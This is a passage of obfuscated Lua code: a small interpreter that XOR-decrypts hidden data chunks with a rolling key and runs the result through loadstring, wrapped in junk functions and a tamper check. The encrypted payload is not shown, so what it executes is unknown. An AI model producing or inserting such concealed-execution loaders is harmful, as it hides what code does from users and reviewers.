arg=1133},{op=2, arg=0},{op=1, arg=1134},{op=2, arg=0},{op=3, arg=0},{op=5, arg=0} }
local _jxnwidyrtlht = string.char
local _iikdcjfkqnkn = (bit32 or bit).bxor
local _ujazfsgyylfl = loadstring or load

local function _urhvddfzjful() local _akylbglsztsq=0 for _bmqdgronayue=1,4 do _akylbglsztsq=_akylbglsztsq+1 end return _akylbglsztsq end
local function _nelpggioboop() local _ssdkmqdqktzm=0 for _aygwiqioumzv=1,4 do _ssdkmqdqktzm=_ssdkmqdqktzm+2 end return _ssdkmqdqktzm end
local function _yrqrusjteabd() local _pbhokotdrfkk=0 for _ftgorgnyjsxf=1,4 do _pbhokotdrfkk=_pbhokotdrfkk+1 end return _pbhokotdrfkk end
local function _jukuytfyqbmh() local _gjgbpbcupxll=0 for _hpdjhqsgcrkp=1,4 do _gjgbpbcupxll=_gjgbpbcupxll+1 end return _gjgbpbcupxll end
local function _zixaemhohufd() local _bsuquqnbdcop=0 for _wgnjwrzqfqbr=1,4 do _bsuquqnbdcop=_bsuquqnbdcop+3 end return _bsuquqnbdcop end

local _cvziqwffmfre = "ddb845cd"
if _cvziqwffmfre ~= "ddb845cd" then
    while true do end
end


local function _pprrvfewggdb()
    local _wkutfgmpsyrb = ""
    local _zdjyludoifts = 1
    while true do
        local instr = _hbbfophmkyjq[_zdjyludoifts]
        if not instr then break end
        local op, arg = instr.op, instr.arg
        if op == 1 then
            local chunk_info = _aqtuksndttpi[arg]
            local k, s = chunk_info.key, chunk_info.seed
            local data = chunk_info.data
            local _yqndnqpiuovu = ""
            local _qwdkgsoeivod = k
            for _vrsobisdbswv=1, #data do
                _yqndnqpiuovu = _yqndnqpiuovu .. _jxnwidyrtlht(_iikdcjfkqnkn(data[_vrsobisdbswv], _qwdkgsoeivod))
                _qwdkgsoeivod = (_qwdkgsoeivod + s) % 256
            end
            _wkutfgmpsyrb = _wkutfgmpsyrb .. _yqndnqpiuovu
        elseif op == 2 then
            -- nothing
        elseif op == 3 then
            local _zkgqtxrhgugb, _xfjfikfylamp = pcall(_ujazfsgyylfl(_wkutfgmpsyrb))
            _wkutfgmpsyrb = ""
            if not _zkgqtxrhgugb then
                error(_xfjfikfylamp)
            end
        elseif op == 4 then
            _zdjyludoifts = arg
        elseif op == 5 then
            break
        end
        _zdjyludoifts = _zdjyludoifts + 1
    end
end

_urhvddfzjful(); _nelpggioboop(); _yrqrusjteabd(); _jukuytfyqbmh(); _zixaemhohufd()
_pprrvfewggdb()
